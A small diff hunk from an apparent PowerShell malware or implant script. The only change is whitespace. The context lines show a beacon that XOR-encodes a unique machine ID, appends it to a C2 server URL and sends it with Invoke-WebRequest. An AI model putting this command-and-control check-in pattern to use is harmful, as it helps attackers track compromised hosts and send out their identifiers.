@@ -34,7 +34,7 @@ $data_value = Xor-String -InputString $unique_id -XorKey 7
 
 # Build the URL with the unique ID as a query parameter
 $parameter = "{0}={1}&{2}={3}" -f $type, $type_value, $data, $data_value;
-$url = $c2_url + $parameter
+$url = $c2_url + $parameter 
 
 # Send a GET request to the server and get the response
 $response = Invoke-WebRequest $url
